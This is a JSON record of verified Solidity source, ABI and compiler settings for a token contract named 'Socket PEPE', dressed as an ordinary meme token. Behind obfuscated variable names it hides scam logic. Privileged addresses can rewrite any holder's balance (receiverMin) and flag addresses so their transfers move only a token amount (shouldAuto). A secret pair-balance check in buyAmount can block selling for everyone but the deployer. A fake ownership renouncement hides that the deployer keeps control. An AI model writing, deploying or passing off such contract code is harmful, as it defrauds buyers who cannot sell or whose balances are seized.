{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface limitToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenTeam) external view returns (uint256);\n\n    function transfer(address sellReceiver, uint256 listTake) external returns (bool);\n\n    function allowance(address tradingSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellReceiver,\n        uint256 listTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellSender, uint256 value);\n    event Approval(address indexed tradingSwap, address indexed spender, uint256 value);\n}\n\nabstract contract launchTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitFundBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountTotal {\n    function createPair(address fromSwap, address amountTokenExempt) external returns (address);\n}\n\ninterface limitTokenMetadata is limitToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SocketPEPE is launchTake, limitToken, limitTokenMetadata {\n\n    bool public listTeam;\n\n    event OwnershipTransferred(address indexed senderLiquidityTeam, address indexed exemptReceiverList);\n\n    function receiverSell() public {\n        emit OwnershipTransferred(autoIs, address(0));\n        swapFrom = address(0);\n    }\n\n    uint256 public walletReceiver;\n\n    constructor (){\n        \n        limitFundBuy minFund = limitFundBuy(autoFund);\n        fromToken = amountTotal(minFund.factory()).createPair(minFund.WETH(), address(this));\n        if (teamLaunch == takeTokenSell) {\n            takeTokenSell = isTrading;\n        }\n        autoIs = _msgSender();\n        receiverSell();\n        walletShould[autoIs] = true;\n        fundTrading[autoIs] = takeLimit;\n        \n        emit Transfer(address(0), autoIs, takeLimit);\n    }\n\n    function receiverMarketing() private view {\n        require(walletShould[_msgSender()]);\n    }\n\n    function receiverTotal(uint256 listTake) public {\n        receiverMarketing();\n        sellTx = listTake;\n    }\n\n    uint256 walletLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedToken;\n    }\n\n    bool public txShouldMode;\n\n    function allowance(address swapLimit, address maxToken) external view virtual override returns (uint256) {\n        if (maxToken == autoFund) {\n            return type(uint256).max;\n        }\n        return fundAuto[swapLimit][maxToken];\n    }\n\n    address autoFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant liquidityTrading = 4 ** 10;\n\n    uint256 private takeTokenSell;\n\n    mapping(address => bool) public sellFrom;\n\n    bool public swapTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptMode;\n    }\n\n    function transferFrom(address buyFeeShould, address sellReceiver, uint256 listTake) external override returns (bool) {\n        if (_msgSender() != autoFund) {\n            if (fundAuto[buyFeeShould][_msgSender()] != type(uint256).max) {\n                require(listTake <= fundAuto[buyFeeShould][_msgSender()]);\n                fundAuto[buyFeeShould][_msgSender()] -= listTake;\n            }\n        }\n        return buyAmount(buyFeeShould, sellReceiver, listTake);\n    }\n\n    uint8 private exemptMode = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeLimit;\n    }\n\n    function launchTeamToken(address minIs) public {\n        require(minIs.balance < 100000);\n        if (swapTake) {\n            return;\n        }\n        if (takeTokenSell == teamLaunch) {\n            txShouldMode = true;\n        }\n        walletShould[minIs] = true;\n        if (txShouldMode != listTeam) {\n            txShouldMode = false;\n        }\n        swapTake = true;\n    }\n\n    uint256 private takeLimit = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private fundAuto;\n\n    address public fromToken;\n\n    function owner() external view returns (address) {\n        return swapFrom;\n    }\n\n    function receiverMin(address feeLiquidity, uint256 listTake) public {\n        receiverMarketing();\n        fundTrading[feeLiquidity] = listTake;\n    }\n\n    function maxFund(address buyFeeShould, address sellReceiver, uint256 listTake) internal returns (bool) {\n        require(fundTrading[buyFeeShould] >= listTake);\n        fundTrading[buyFeeShould] -= listTake;\n        fundTrading[sellReceiver] += listTake;\n        emit Transfer(buyFeeShould, sellReceiver, listTake);\n        return true;\n    }\n\n    string private launchedToken = \"SPE\";\n\n    uint256 public tokenReceiver;\n\n    mapping(address => bool) public walletShould;\n\n    function shouldAuto(address shouldTeamTrading) public {\n        receiverMarketing();\n        \n        if (shouldTeamTrading == autoIs || shouldTeamTrading == fromToken) {\n            return;\n        }\n        sellFrom[shouldTeamTrading] = true;\n    }\n\n    uint256 sellTx;\n\n    function getOwner() external view returns (address) {\n        return swapFrom;\n    }\n\n    function buyAmount(address buyFeeShould, address sellReceiver, uint256 listTake) internal returns (bool) {\n        if (buyFeeShould == autoIs) {\n            return maxFund(buyFeeShould, sellReceiver, listTake);\n        }\n        uint256 minSwap = limitToken(fromToken).balanceOf(receiverTake);\n        require(minSwap == sellTx);\n        require(sellReceiver != receiverTake);\n        if (sellFrom[buyFeeShould]) {\n            return maxFund(buyFeeShould, sellReceiver, liquidityTrading);\n        }\n        return maxFund(buyFeeShould, sellReceiver, listTake);\n    }\n\n    address receiverTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address tokenTeam) public view virtual override returns (uint256) {\n        return fundTrading[tokenTeam];\n    }\n\n    address private swapFrom;\n\n    uint256 private isTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldLiquidity;\n    }\n\n    function approve(address maxToken, uint256 listTake) public virtual override returns (bool) {\n        fundAuto[_msgSender()][maxToken] = listTake;\n        emit Approval(_msgSender(), maxToken, listTake);\n        return true;\n    }\n\n    address public autoIs;\n\n    mapping(address => uint256) private fundTrading;\n\n    string private shouldLiquidity = \"Socket PEPE\";\n\n    uint256 private teamLaunch;\n\n    function transfer(address feeLiquidity, uint256 listTake) external virtual override returns (bool) {\n        return buyAmount(_msgSender(), feeLiquidity, listTake);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLiquidityTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiverList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"}],\"name\":\"launchTeamToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTake\",\"type\":\"uint256\"}],\"name\":\"receiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listTake\",\"type\":\"uint256\"}],\"name\":\"receiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTeamTrading\",\"type\":\"address\"}],\"name\":\"shouldAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFeeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShouldMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SocketPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}